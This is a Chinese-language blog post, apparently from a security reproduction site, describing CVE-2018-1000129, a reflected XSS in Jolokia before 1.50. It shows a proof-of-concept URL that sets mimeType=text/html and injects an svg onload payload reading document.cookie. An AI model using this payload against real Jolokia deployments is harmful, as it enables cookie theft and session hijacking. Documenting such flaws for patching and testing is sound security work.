+    <article id="post-Jolokia/（CVE-2018-1000129）Jolokia 反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000129%EF%BC%89Jolokia%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.232Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-1000129）Jolokia-反射型xss"><a href="#（CVE-2018-1000129）Jolokia-反射型xss" class="headerlink" title="（CVE-2018-1000129）Jolokia 反射型xss"></a>（CVE-2018-1000129）Jolokia 反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jolokia &lt; 1.50</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>Jolokia Web应用程序容易受到经典的”<br>**反射跨站点脚本（XSS）”**攻击。默认情况下，Jolokia返回带有<em>application<br>/<br>json</em>内容类型的响应，因此在大多数情况下，将用户提供的输入插入响应中并不是什么大问题。但是通过阅读源代码发现，仅通过向<code>mimeType</code>请求添加GET参数就可以修改响应的Content-Type<br>：</p>
+<pre><code>http://www.0-sec.org:8161/api/jolokia/read?mimeType=text/html
+</code></pre>
+<p>之后，相对容易地找到至少一个在响应中按原样插入URL参数的情况：</p>
+<pre><code>http://www.0-sec.org:8161/api/jolokia/read&lt;svg%20onload=alert(docu
+ment.cookie)&gt;?mimeType=text/html
+</code></pre>
+<p>使用<code>text/html</code>Content<br>Type，可以实现经典的反射XSS攻击。利用此问题，攻击者可以在应用程序输入参数内提供任意客户端JavaScript代码，这些代码最终将在最终用户的Web浏览器中呈现和执行。可以利用它来窃取易受攻击的域中的cookie，并有可能获得对用户身份验证会话的未授权访问，更改易受攻击的网页的内容或损害用户的Web浏览器。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000129%EF%BC%89Jolokia%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000129%EF%BC%89Jolokia%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qrjy009by8v1hq6ihdj5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/65/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/64/">64</a><a class="page-number" href="/page/65/">65</a><span class="page-number current">66</span><a class="page-number" href="/page/67/">67</a><a class="page-number" href="/page/68/">68</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/67/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
